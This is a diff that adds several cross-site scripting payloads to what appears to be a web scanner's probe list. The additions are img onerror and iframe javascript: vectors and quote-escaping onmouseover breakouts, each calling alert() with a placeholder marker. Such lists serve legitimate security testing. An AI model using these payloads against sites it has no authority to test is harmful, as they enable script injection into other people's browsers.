@@ -33,6 +33,11 @@
 %0d%0a<script>alert("[randmark]")</script>
 <a href='javascript:alert("[randmark]")'>click me</a>
 <img src="x" onerror='alert("[randmark]")'>
+<img/src/onerror=alert("[randmark]")>
+<iframe src='javascript:alert("[randmark]")'></iframe>
+ onmouseover='alert("[randmark]")'
 " onmouseover='alert("[randmark]")'
 ' onmouseover='alert("[randmark]")'
+\" onmouseover='alert("[randmark]")'
+\' onmouseover='alert("[randmark]")'
 javascript:alert("[randmark]")
